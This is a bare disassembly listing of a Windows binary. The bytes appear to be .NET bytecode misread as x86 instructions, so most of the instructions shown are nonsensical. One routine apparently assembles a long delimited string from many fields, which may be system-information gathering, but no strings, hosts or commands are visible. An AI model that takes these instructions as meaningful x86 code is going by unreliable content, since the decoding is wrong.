  4025e9:	06                   	push   %es
  4025ea:	2a 00                	sub    (%eax),%al
  4025ec:	00 06                	add    %al,(%esi)
  4025ee:	73 3e                	jae    0x40262e
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	0a 14 17             	or     (%edi,%edx,1),%dl
  4025f5:	17                   	pop    %ss
  4025f6:	73 3f                	jae    0x402637
  4025f8:	00 00                	add    %al,(%eax)
  4025fa:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  402600:	de 20                	fisubs (%eax)
  402602:	25 28 23 00 00       	and    $0x2328,%eax
  402607:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40260a:	80 10 00             	adcb   $0x0,(%eax)
  40260d:	00 04 28             	add    %al,(%eax,%ebp,1)
  402610:	25 00 00 0a de       	and    $0xde0a0000,%eax
  402615:	0c 7e                	or     $0x7e,%al
  402617:	16                   	push   %ss
  402618:	00 00                	add    %al,(%eax)
  40261a:	04 6f                	add    $0x6f,%al
  40261c:	40                   	inc    %eax
  40261d:	00 00                	add    %al,(%eax)
  40261f:	0a 26                	or     (%esi),%ah
  402621:	dc 06                	faddl  (%esi)
  402623:	2a 41 34             	sub    0x34(%ecx),%al
	...
  40262e:	00 00                	add    %al,(%eax)
  402630:	0e                   	push   %cs
  402631:	01 00                	add    %eax,(%eax)
  402633:	00 0e                	add    %cl,(%esi)
  402635:	01 00                	add    %eax,(%eax)
  402637:	00 14 00             	add    %dl,(%eax,%eax,1)
  40263a:	00 00                	add    %al,(%eax)
  40263c:	26 00 00             	add    %al,%es:(%eax)
  40263f:	01 02                	add    %eax,(%edx)
  402641:	00 00                	add    %al,(%eax)
  402643:	00 00                	add    %al,(%eax)
  402645:	00 00                	add    %al,(%eax)
  402647:	00 22                	add    %ah,(%edx)
  402649:	01 00                	add    %eax,(%eax)
  40264b:	00 22                	add    %ah,(%edx)
  40264d:	01 00                	add    %eax,(%eax)
  40264f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402652:	00 00                	add    %al,(%eax)
  402654:	00 00                	add    %al,(%eax)
  402656:	00 00                	add    %al,(%eax)
  402658:	13 30                	adc    (%eax),%esi
  40265a:	05 00 58 01 00       	add    $0x15800,%eax
  40265f:	00 0f                	add    %cl,(%edi)
  402661:	00 00                	add    %al,(%eax)
  402663:	11 73 41             	adc    %esi,0x41(%ebx)
  402666:	00 00                	add    %al,(%eax)
  402668:	0a 0b                	or     (%ebx),%cl
  40266a:	1f                   	pop    %ds
  40266b:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  402671:	0d 09 16 72 8a       	or     $0x8a721609,%eax
  402676:	01 00                	add    %eax,(%eax)
  402678:	70 a2                	jo     0x40261c
  40267a:	09 17                	or     %edx,(%edi)
  40267c:	7e 0a                	jle    0x402688
  40267e:	00 00                	add    %al,(%eax)
  402680:	04 a2                	add    $0xa2,%al
  402682:	09 18                	or     %ebx,(%eax)
  402684:	28 61 00             	sub    %ah,0x0(%ecx)
  402687:	00 06                	add    %al,(%esi)
  402689:	a2 09 19 7e 0a       	mov    %al,0xa7e1909
  40268e:	00 00                	add    %al,(%eax)
  402690:	04 a2                	add    $0xa2,%al
  402692:	09 1a                	or     %ebx,(%edx)
  402694:	28 42 00             	sub    %al,0x0(%edx)
  402697:	00 0a                	add    %cl,(%edx)
  402699:	a2 09 1b 7e 0a       	mov    %al,0xa7e1b09
  40269e:	00 00                	add    %al,(%eax)
  4026a0:	04 a2                	add    $0xa2,%al
  4026a2:	09 1c 07             	or     %ebx,(%edi,%eax,1)
  4026a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a6:	43                   	inc    %ebx
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	0a 72 94             	or     -0x6c(%edx),%dh
  4026ac:	01 00                	add    %eax,(%eax)
  4026ae:	70 14                	jo     0x4026c4
  4026b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026b1:	44                   	inc    %esp
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	0a a2 09 1d 28 45    	or     0x45281d09(%edx),%ah
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	0a 6f 46             	or     0x46(%edi),%ch
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	0a 72 a8             	or     -0x58(%edx),%dh
  4026c4:	01 00                	add    %eax,(%eax)
  4026c6:	70 72                	jo     0x40273a
  4026c8:	c2 01 00             	ret    $0x1
  4026cb:	70 6f                	jo     0x40273c
  4026cd:	44                   	inc    %esp
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	0a 72 c8             	or     -0x38(%edx),%dh
  4026d3:	01 00                	add    %eax,(%eax)
  4026d5:	70 28                	jo     0x4026ff
  4026d7:	1e                   	push   %ds
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	0a a2 09 1e 28 47    	or     0x47281e09(%edx),%ah
  4026e0:	00 00                	add    %al,(%eax)
  4026e2:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4026e5:	02 28                	add    (%eax),%ch
  4026e7:	48                   	dec    %eax
  4026e8:	00 00                	add    %al,(%eax)
  4026ea:	0a 72 cc             	or     -0x34(%edx),%dh
  4026ed:	01 00                	add    %eax,(%eax)
  4026ef:	70 72                	jo     0x402763
  4026f1:	d8 01                	fadds  (%ecx)
  4026f3:	00 70 6f             	add    %dh,0x6f(%eax)
  4026f6:	44                   	inc    %esp
  4026f7:	00 00                	add    %al,(%eax)
  4026f9:	0a 72 e4             	or     -0x1c(%edx),%dh
  4026fc:	01 00                	add    %eax,(%eax)
  4026fe:	70 72                	jo     0x402772
  402700:	ee                   	out    %al,(%dx)
  402701:	01 00                	add    %eax,(%eax)
  402703:	70 6f                	jo     0x402774
  402705:	44                   	inc    %esp
  402706:	00 00                	add    %al,(%eax)
  402708:	0a a2 09 1f 09 7e    	or     0x7e091f09(%edx),%ah
  40270e:	0a 00                	or     (%eax),%al
  402710:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402713:	09 1f                	or     %ebx,(%edi)
  402715:	0a 7e 0c             	or     0xc(%esi),%bh
  402718:	00 00                	add    %al,(%eax)
  40271a:	04 a2                	add    $0xa2,%al
  40271c:	09 1f                	or     %ebx,(%edi)
  40271e:	0b 7e 0a             	or     0xa(%esi),%edi
  402721:	00 00                	add    %al,(%eax)
  402723:	04 a2                	add    $0xa2,%al
  402725:	09 1f                	or     %ebx,(%edi)
  402727:	0c 28                	or     $0x28,%al
  402729:	1e                   	push   %ds
  40272a:	00 00                	add    %al,(%eax)
  40272c:	06                   	push   %es
  40272d:	a2 09 1f 0d 7e       	mov    %al,0x7e0d1f09
  402732:	0a 00                	or     (%eax),%al
  402734:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402737:	09 1f                	or     %ebx,(%edi)
  402739:	0e                   	push   %cs
  40273a:	28 1f                	sub    %bl,(%edi)
  40273c:	00 00                	add    %al,(%eax)
  40273e:	06                   	push   %es
  40273f:	a2 09 1f 0f 7e       	mov    %al,0x7e0f1f09
  402744:	0a 00                	or     (%eax),%al
  402746:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402749:	09 1f                	or     %ebx,(%edi)
  40274b:	10 28                	adc    %ch,(%eax)
  40274d:	20 00                	and    %al,(%eax)
  40274f:	00 06                	add    %al,(%esi)
  402751:	a2 09 1f 11 7e       	mov    %al,0x7e111f09
  402756:	0a 00                	or     (%eax),%al
  402758:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40275b:	09 1f                	or     %ebx,(%edi)
  40275d:	12 28                	adc    (%eax),%ch
  40275f:	38 00                	cmp    %al,(%eax)
  402761:	00 06                	add    %al,(%esi)
  402763:	8c 3b                	mov    %?,(%ebx)
  402765:	00 00                	add    %al,(%eax)
  402767:	01 a2 09 1f 13 7e    	add    %esp,0x7e131f09(%edx)
  40276d:	0a 00                	or     (%eax),%al
  40276f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402772:	09 1f                	or     %ebx,(%edi)
  402774:	14 28                	adc    $0x28,%al
  402776:	23 00                	and    (%eax),%eax
  402778:	00 06                	add    %al,(%esi)
  40277a:	a2 09 1f 15 7e       	mov    %al,0x7e151f09
  40277f:	0a 00                	or     (%eax),%al
  402781:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402784:	09 1f                	or     %ebx,(%edi)
  402786:	16                   	push   %ss
  402787:	28 22                	sub    %ah,(%edx)
  402789:	00 00                	add    %al,(%eax)
  40278b:	06                   	push   %es
  40278c:	a2 09 1f 17 7e       	mov    %al,0x7e171f09
  402791:	0a 00                	or     (%eax),%al
  402793:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402796:	09 1f                	or     %ebx,(%edi)
  402798:	18 28                	sbb    %ch,(%eax)
  40279a:	24 00                	and    $0x0,%al
  40279c:	00 06                	add    %al,(%esi)
  40279e:	a2 09 1f 19 7e       	mov    %al,0x7e191f09
  4027a3:	0a 00                	or     (%eax),%al
  4027a5:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4027a8:	09 1f                	or     %ebx,(%edi)
  4027aa:	1a 28                	sbb    (%eax),%ch
  4027ac:	21 00                	and    %eax,(%eax)
  4027ae:	00 06                	add    %al,(%esi)
  4027b0:	a2 09 28 49 00       	mov    %al,0x492809
  4027b5:	00 0a                	add    %cl,(%edx)
  4027b7:	0a 2b                	or     (%ebx),%ch
  4027b9:	00 06                	add    %al,(%esi)
  4027bb:	2a 1b                	sub    (%ebx),%bl
  4027bd:	30 02                	xor    %al,(%edx)
  4027bf:	00 40 00             	add    %al,0x0(%eax)
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	10 00                	adc    %al,(%eax)
  4027c6:	00 11                	add    %dl,(%ecx)
  4027c8:	7e 29                	jle    0x4027f3
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	04 73                	add    $0x73,%al
  4027ce:	4a                   	dec    %edx
  4027cf:	00 00                	add    %al,(%eax)
  4027d1:	0a 0b                	or     (%ebx),%cl
  4027d3:	07                   	pop    %es
  4027d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d5:	4b                   	dec    %ebx
  4027d6:	00 00                	add    %al,(%eax)
  4027d8:	0a 0d 12 03 72 fa    	or     0xfa720312,%cl
  4027de:	01 00                	add    %eax,(%eax)
  4027e0:	70 28                	jo     0x40280a
  4027e2:	4c                   	dec    %esp
  4027e3:	00 00                	add    %al,(%eax)
  4027e5:	0a 0a                	or     (%edx),%cl
  4027e7:	de 1d de 1b 25 28    	ficomps 0x28251bde
  4027ed:	23 00                	and    (%eax),%eax
  4027ef:	00 0a                	add    %cl,(%edx)
  4027f1:	0c 72                	or     $0x72,%al
  4027f3:	0e                   	push   %cs
  4027f4:	02 00                	add    (%eax),%al
  4027f6:	70 0a                	jo     0x402802
  4027f8:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4027fe:	07                   	pop    %es
  4027ff:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402805:	00 06                	add    %al,(%esi)
  402807:	2a 01                	sub    (%ecx),%al
  402809:	10 00                	adc    %al,(%eax)
  40280b:	00 00                	add    %al,(%eax)
  40280d:	00 00                	add    %al,(%eax)
  40280f:	00 23                	add    %ah,(%ebx)
  402811:	23 00                	and    (%eax),%eax
  402813:	1b 26                	sbb    (%esi),%esp
  402815:	00 00                	add    %al,(%eax)
  402817:	01 1b                	add    %ebx,(%ebx)
  402819:	30 03                	xor    %al,(%ebx)
  40281b:	00 49 00             	add    %cl,0x0(%ecx)
  40281e:	00 00                	add    %al,(%eax)
  402820:	11 00                	adc    %eax,(%eax)
  402822:	00 11                	add    %dl,(%ecx)
  402824:	7e 29                	jle    0x40284f
  402826:	00 00                	add    %al,(%eax)
  402828:	04 28                	add    $0x28,%al
  40282a:	4d                   	dec    %ebp
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 7e 0d             	or     0xd(%esi),%bh
  402830:	00 00                	add    %al,(%eax)
  402832:	04 16                	add    $0x16,%al
  402834:	28 4e 00             	sub    %cl,0x0(%esi)
  402837:	00 0a                	add    %cl,(%edx)
  402839:	16                   	push   %ss
  40283a:	33 0a                	xor    (%edx),%ecx
  40283c:	72 e4                	jb     0x402822
  40283e:	01 00                	add    %eax,(%eax)
  402840:	70 0a                	jo     0x40284c
  402842:	de 27                	fisubs (%edi)
  402844:	2b 08                	sub    (%eax),%ecx
  402846:	72 cc                	jb     0x402814
  402848:	01 00                	add    %eax,(%eax)
  40284a:	70 0a                	jo     0x402856
  40284c:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402852:	23 00                	and    (%eax),%eax
  402854:	00 0a                	add    %cl,(%edx)
  402856:	0b 72 0e             	or     0xe(%edx),%esi
  402859:	02 00                	add    (%eax),%al
  40285b:	70 0a                	jo     0x402867
  40285d:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402863:	07                   	pop    %es
  402864:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  40286a:	00 06                	add    %al,(%esi)
  40286c:	2a 00                	sub    (%eax),%al
  40286e:	00 00                	add    %al,(%eax)
  402870:	01 10                	add    %edx,(%eax)
  402872:	00 00                	add    %al,(%eax)
  402874:	00 00                	add    %al,(%eax)
  402876:	00 00                	add    %al,(%eax)
  402878:	2c 2c                	sub    $0x2c,%al
  40287a:	00 1b                	add    %bl,(%ebx)
  40287c:	26 00 00             	add    %al,%es:(%eax)
  40287f:	01 1b                	add    %ebx,(%ebx)
  402881:	30 02                	xor    %al,(%edx)
  402883:	00 3e                	add    %bh,(%esi)
  402885:	00 00                	add    %al,(%eax)
  402887:	00 12                	add    %dl,(%edx)
  402889:	00 00                	add    %al,(%eax)
  40288b:	11 28                	adc    %ebp,(%eax)
  40288d:	4f                   	dec    %edi
  40288e:	00 00                	add    %al,(%eax)
  402890:	0a 73 50             	or     0x50(%ebx),%dh
  402893:	00 00                	add    %al,(%eax)
  402895:	0a 20                	or     (%eax),%ah
  402897:	20 02                	and    %al,(%edx)
  402899:	00 00                	add    %al,(%eax)
  40289b:	6f                   	outsl  %ds:(%esi),(%dx)
  40289c:	51                   	push   %ecx
  40289d:	00 00                	add    %al,(%eax)
  40289f:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4028a2:	02 28                	add    (%eax),%ch
  4028a4:	48                   	dec    %eax
  4028a5:	00 00                	add    %al,(%eax)
  4028a7:	0a 0a                	or     (%edx),%cl
  4028a9:	de 1d de 1b 25 28    	ficomps 0x28251bde
  4028af:	23 00                	and    (%eax),%eax
  4028b1:	00 0a                	add    %cl,(%edx)
  4028b3:	0b 72 0e             	or     0xe(%edx),%esi
  4028b6:	02 00                	add    (%eax),%al
  4028b8:	70 0a                	jo     0x4028c4
  4028ba:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4028c0:	07                   	pop    %es
  4028c1:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4028c7:	00 06                	add    %al,(%esi)
  4028c9:	2a 00                	sub    (%eax),%al
  4028cb:	00 01                	add    %al,(%ecx)
  4028cd:	10 00                	adc    %al,(%eax)
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	00 00                	add    %al,(%eax)
  4028d3:	00 21                	add    %ah,(%ecx)
  4028d5:	21 00                	and    %eax,(%eax)
  4028d7:	1b 26                	sbb    (%esi),%esp
  4028d9:	00 00                	add    %al,(%eax)
  4028db:	01 1b                	add    %ebx,(%ebx)
  4028dd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4028e0:	cf                   	iret
  4028e1:	00 00                	add    %al,(%eax)
  4028e3:	00 13                	add    %dl,(%ebx)
  4028e5:	00 00                	add    %al,(%eax)
  4028e7:	11 72 1a             	adc    %esi,0x1a(%edx)
  4028ea:	02 00                	add    (%eax),%al
  4028ec:	70 28                	jo     0x402916
  4028ee:	52                   	push   %edx
  4028ef:	00 00                	add    %al,(%eax)
  4028f1:	0a 72 20             	or     0x20(%edx),%dh
  4028f4:	02 00                	add    (%eax),%al
  4028f6:	70 28                	jo     0x402920
  4028f8:	53                   	push   %ebx
  4028f9:	00 00                	add    %al,(%eax)
  4028fb:	0a 72 4c             	or     0x4c(%edx),%dh
  4028fe:	02 00                	add    (%eax),%al
  402900:	70 73                	jo     0x402975
  402902:	54                   	push   %esp
  402903:	00 00                	add    %al,(%eax)
  402905:	0a 0b                	or     (%ebx),%cl
  402907:	73 55                	jae    0x40295e
  402909:	00 00                	add    %al,(%eax)
  40290b:	0a 0c 07             	or     (%edi,%eax,1),%cl
  40290e:	6f                   	outsl  %ds:(%esi),(%dx)
  40290f:	56                   	push   %esi
  402910:	00 00                	add    %al,(%eax)
  402912:	0a 6f 57             	or     0x57(%edi),%ch
  402915:	00 00                	add    %al,(%eax)
  402917:	0a 13                	or     (%ebx),%dl
  402919:	05 2b 2b 11 05       	add    $0x5112b2b,%eax
  40291e:	6f                   	outsl  %ds:(%esi),(%dx)
  40291f:	58                   	pop    %eax
  402920:	00 00                	add    %al,(%eax)
  402922:	0a 0d 08 09 72 8a    	or     0x8a720908,%cl
  402928:	02 00                	add    (%eax),%al
  40292a:	70 6f                	jo     0x40299b
  40292c:	59                   	pop    %ecx
  40292d:	00 00                	add    %al,(%eax)
  40292f:	0a 6f 15             	or     0x15(%edi),%ch
  402932:	00 00                	add    %al,(%eax)
  402934:	0a 6f 5a             	or     0x5a(%edi),%ch
  402937:	00 00                	add    %al,(%eax)
  402939:	0a 26                	or     (%esi),%ah
  40293b:	08 72 a2             	or     %dh,-0x5e(%edx)
  40293e:	02 00                	add    (%eax),%al
  402940:	70 6f                	jo     0x4029b1
  402942:	5a                   	pop    %edx
  402943:	00 00                	add    %al,(%eax)
  402945:	0a 26                	or     (%esi),%ah
  402947:	11 05 6f 5b 00 00    	adc    %eax,0x5b6f
  40294d:	0a 2d cc de 0c 11    	or     0x110cdecc,%ch
  402953:	05 2c 07 11 05       	add    $0x511072c,%eax
  402958:	6f                   	outsl  %ds:(%esi),(%dx)
  402959:	30 00                	xor    %al,(%eax)
  40295b:	00 0a                	add    %cl,(%edx)
  40295d:	dc 08                	fmull  (%eax)
  40295f:	6f                   	outsl  %ds:(%esi),(%dx)
  402960:	5c                   	pop    %esp
  402961:	00 00                	add    %al,(%eax)
  402963:	0a 6f 5d             	or     0x5d(%edi),%ch
  402966:	00 00                	add    %al,(%eax)
  402968:	0a 16                	or     (%esi),%dl
  40296a:	33 08                	xor    (%eax),%ecx
  40296c:	72 a6                	jb     0x402914
  40296e:	02 00                	add    (%eax),%al
  402970:	70 0a                	jo     0x40297c
  402972:	de 41 08             	fiadds 0x8(%ecx)
  402975:	6f                   	outsl  %ds:(%esi),(%dx)
  402976:	5c                   	pop    %esp
  402977:	00 00                	add    %al,(%eax)
  402979:	0a 16                	or     (%esi),%dl
  40297b:	08 6f 5e             	or     %ch,0x5e(%edi)
  40297e:	00 00                	add    %al,(%eax)
  402980:	0a 17                	or     (%edi),%dl
  402982:	da 6f 5f             	fisubrl 0x5f(%edi)
  402985:	00 00                	add    %al,(%eax)
  402987:	0a 0a                	or     (%edx),%cl
  402989:	de 2a                	fisubrs (%edx)
  40298b:	de 0a                	fimuls (%edx)
  40298d:	07                   	pop    %es
  40298e:	2c 06                	sub    $0x6,%al
  402990:	07                   	pop    %es
  402991:	6f                   	outsl  %ds:(%esi),(%dx)
  402992:	30 00                	xor    %al,(%eax)
  402994:	00 0a                	add    %cl,(%edx)
  402996:	dc de                	(bad)
  402998:	1c 25                	sbb    $0x25,%al
  40299a:	28 23                	sub    %ah,(%ebx)
  40299c:	00 00                	add    %al,(%eax)
  40299e:	0a 13                	or     (%ebx),%dl
  4029a0:	04 72                	add    $0x72,%al
  4029a2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4029a3:	02 00                	add    (%eax),%al
  4029a5:	70 0a                	jo     0x4029b1
  4029a7:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4029ad:	07                   	pop    %es
  4029ae:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4029b4:	00 06                	add    %al,(%esi)
  4029b6:	2a 00                	sub    (%eax),%al
  4029b8:	01 28                	add    %ebp,(%eax)
  4029ba:	00 00                	add    %al,(%eax)
  4029bc:	02 00                	add    (%eax),%al
  4029be:	25 00 45 6a 00       	and    $0x6a4500,%eax
  4029c3:	0c 00                	or     $0x0,%al
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	00 02                	add    %al,(%edx)
  4029c9:	00 1f                	add    %bl,(%edi)
  4029cb:	00 86 a5 00 0a 00    	add    %al,0xa00a5(%esi)
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	00 00                	add    %al,(%eax)
  4029d7:	00 b1 b1 00 1c 26    	add    %dh,0x261c00b1(%ecx)
  4029dd:	00 00                	add    %al,(%eax)
  4029df:	01 1b                	add    %ebx,(%ebx)
  4029e1:	30 03                	xor    %al,(%ebx)
  4029e3:	00 8f 00 00 00 14    	add    %cl,0x14000000(%edi)
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	11 7e 60             	adc    %edi,0x60(%esi)
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	0a 0d 72 b0 02 00    	or     0x2b072,%cl
  4029f6:	70 73                	jo     0x402a6b
  4029f8:	61                   	popa
  4029f9:	00 00                	add    %al,(%eax)
  4029fb:	0a 0b                	or     (%ebx),%cl
  4029fd:	07                   	pop    %es
  4029fe:	73 62                	jae    0x402a62
  402a00:	00 00                	add    %al,(%eax)
  402a02:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402a05:	6f                   	outsl  %ds:(%esi),(%dx)
  402a06:	56                   	push   %esi
  402a07:	00 00                	add    %al,(%eax)
  402a09:	0a 6f 57             	or     0x57(%edi),%ch
  402a0c:	00 00                	add    %al,(%eax)
  402a0e:	0a 13                	or     (%ebx),%dl
  402a10:	05 2b 30 11 05       	add    $0x511302b,%eax
  402a15:	6f                   	outsl  %ds:(%esi),(%dx)
  402a16:	58                   	pop    %eax
  402a17:	00 00                	add    %al,(%eax)
  402a19:	0a 74 49 00          	or     0x0(%ecx,%ecx,2),%dh
  402a1d:	00 01                	add    %al,(%ecx)
  402a1f:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  402a22:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402a25:	f8                   	clc
  402a26:	02 00                	add    (%eax),%al
  402a28:	70 6f                	jo     0x402a99
  402a2a:	59                   	pop    %ecx
  402a2b:	00 00                	add    %al,(%eax)
  402a2d:	0a 28                	or     (%eax),%ch
  402a2f:	63 00                	arpl   %eax,(%eax)
  402a31:	00 0a                	add    %cl,(%edx)
  402a33:	72 c8                	jb     0x4029fd
  402a35:	01 00                	add    %eax,(%eax)
  402a37:	70 28                	jo     0x402a61
  402a39:	63 00                	arpl   %eax,(%eax)
  402a3b:	00 0a                	add    %cl,(%edx)
  402a3d:	28 22                	sub    %ah,(%edx)
  402a3f:	00 00                	add    %al,(%eax)
  402a41:	0a 0d 11 05 6f 5b    	or     0x5b6f0511,%cl
  402a47:	00 00                	add    %al,(%eax)
  402a49:	0a 2d c7 de 0c 11    	or     0x110cdec7,%ch
  402a4f:	05 2c 07 11 05       	add    $0x511072c,%eax
  402a54:	6f                   	outsl  %ds:(%esi),(%dx)
  402a55:	30 00                	xor    %al,(%eax)
  402a57:	00 0a                	add    %cl,(%edx)
  402a59:	dc 09                	fmull  (%ecx)
  402a5b:	0a de                	or     %dh,%bl
  402a5d:	1b de                	sbb    %esi,%ebx
  402a5f:	19 28                	sbb    %ebp,(%eax)
  402a61:	23 00                	and    (%eax),%eax
  402a63:	00 0a                	add    %cl,(%edx)
  402a65:	72 0e                	jb     0x402a75
  402a67:	02 00                	add    (%eax),%al
  402a69:	70 0a                	jo     0x402a75
  402a6b:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402a71:	07                   	pop    %es
  402a72:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402a78:	00 06                	add    %al,(%esi)
  402a7a:	2a 00                	sub    (%eax),%al
  402a7c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402a7f:	00 02                	add    %al,(%edx)
  402a81:	00 18                	add    %bl,(%eax)
  402a83:	00 4a 62             	add    %cl,0x62(%edx)
  402a86:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a89:	00 00                	add    %al,(%eax)
  402a8b:	00 00                	add    %al,(%eax)
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  402a93:	19 26                	sbb    %esp,(%esi)
  402a95:	00 00                	add    %al,(%eax)
  402a97:	01 1b                	add    %ebx,(%ebx)
  402a99:	30 03                	xor    %al,(%ebx)
  402a9b:	00 83 00 00 00 15    	add    %al,0x15000000(%ebx)
  402aa1:	00 00                	add    %al,(%eax)
  402aa3:	11 72 02             	adc    %esi,0x2(%edx)
  402aa6:	03 00                	add    (%eax),%eax
  402aa8:	70 73                	jo     0x402b1d
  402aaa:	64 00 00             	add    %al,%fs:(%eax)
  402aad:	0a 0b                	or     (%ebx),%cl
  402aaf:	07                   	pop    %es
  402ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ab1:	65 00 00             	add    %al,%gs:(%eax)
  402ab4:	0a 07                	or     (%edi),%al
  402ab6:	72 f8                	jb     0x402ab0
  402ab8:	02 00                	add    (%eax),%al
  402aba:	70 6f                	jo     0x402b2b
  402abc:	59                   	pop    %ecx
  402abd:	00 00                	add    %al,(%eax)
  402abf:	0a 6f 15             	or     0x15(%edi),%ch
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a 72 42             	or     0x42(%edx),%dh
  402ac7:	03 00                	add    (%eax),%eax
  402ac9:	70 72                	jo     0x402b3d
  402acb:	4a                   	dec    %edx
  402acc:	03 00                	add    (%eax),%eax
  402ace:	70 6f                	jo     0x402b3f
  402ad0:	44                   	inc    %esp
  402ad1:	00 00                	add    %al,(%eax)
  402ad3:	0a 72 4c             	or     0x4c(%edx),%dh
  402ad6:	03 00                	add    (%eax),%eax
  402ad8:	70 72                	jo     0x402b4c
  402ada:	4a                   	dec    %edx
  402adb:	03 00                	add    (%eax),%eax
  402add:	70 6f                	jo     0x402b4e
  402adf:	44                   	inc    %esp
  402ae0:	00 00                	add    %al,(%eax)
  402ae2:	0a 72 5e             	or     0x5e(%edx),%dh
  402ae5:	03 00                	add    (%eax),%eax
  402ae7:	70 72                	jo     0x402b5b
  402ae9:	4a                   	dec    %edx
  402aea:	03 00                	add    (%eax),%eax
  402aec:	70 6f                	jo     0x402b5d
  402aee:	44                   	inc    %esp
  402aef:	00 00                	add    %al,(%eax)
  402af1:	0a 0a                	or     (%edx),%cl
  402af3:	de 30                	fidivs (%eax)
  402af5:	07                   	pop    %es
  402af6:	72 f8                	jb     0x402af0
  402af8:	02 00                	add    (%eax),%al
  402afa:	70 6f                	jo     0x402b6b
  402afc:	59                   	pop    %ecx
  402afd:	00 00                	add    %al,(%eax)
  402aff:	0a 6f 15             	or     0x15(%edi),%ch
  402b02:	00 00                	add    %al,(%eax)
  402b04:	0a 0a                	or     (%edx),%cl
  402b06:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402b0c:	23 00                	and    (%eax),%eax
  402b0e:	00 0a                	add    %cl,(%edx)
  402b10:	0c 72                	or     $0x72,%al
  402b12:	0e                   	push   %cs
  402b13:	02 00                	add    (%eax),%al
  402b15:	70 0a                	jo     0x402b21
  402b17:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402b1d:	07                   	pop    %es
  402b1e:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402b24:	00 06                	add    %al,(%esi)
  402b26:	2a 00                	sub    (%eax),%al
  402b28:	01 10                	add    %edx,(%eax)
  402b2a:	00 00                	add    %al,(%eax)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	00 00                	add    %al,(%eax)
  402b30:	66 66 00 1b          	data16 data16 add %bl,(%ebx)
  402b34:	26 00 00             	add    %al,%es:(%eax)
  402b37:	01 1b                	add    %ebx,(%ebx)
  402b39:	30 04 00             	xor    %al,(%eax,%eax,1)
  402b3c:	b9 00 00 00 16       	mov    $0x16000000,%ecx
  402b41:	00 00                	add    %al,(%eax)
  402b43:	11 14 0c             	adc    %edx,(%esp,%ecx,1)
  402b46:	28 04 00             	sub    %al,(%eax,%eax,1)
  402b49:	00 06                	add    %al,(%esi)
  402b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b4c:	66 00 00             	data16 add %al,(%eax)
  402b4f:	0a 6f 67             	or     0x67(%edi),%ch
  402b52:	00 00                	add    %al,(%eax)
  402b54:	0a 8c 4b 00 00 01 28 	or     0x28010000(%ebx,%ecx,2),%cl
  402b5b:	68 00 00 0a 28       	push   $0x280a0000
  402b60:	69 00 00 0a b9 0b    	imul   $0xbb90a00,(%eax),%eax
  402b66:	07                   	pop    %es
  402b67:	20 00                	and    %al,(%eax)
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	40                   	inc    %eax
  402b6c:	6a 31                	push   $0x31
  402b6e:	32 07                	xor    (%edi),%al
  402b70:	6c                   	insb   (%dx),%es:(%edi)
  402b71:	23 00                	and    (%eax),%eax
  402b73:	00 00                	add    %al,(%eax)
  402b75:	00 00                	add    %al,(%eax)
  402b77:	00 d0                	add    %dl,%al
  402b79:	41                   	inc    %ecx
  402b7a:	5b                   	pop    %ebx
  402b7b:	13 04 12             	adc    (%edx,%edx,1),%eax
  402b7e:	04 28                	add    $0x28,%al
  402b80:	6a 00                	push   $0x0
  402b82:	00 0a                	add    %cl,(%edx)
  402b84:	0c 08                	or     $0x8,%al
  402b86:	1a 08                	sbb    (%eax),%cl
  402b88:	6f                   	outsl  %ds:(%esi),(%dx)
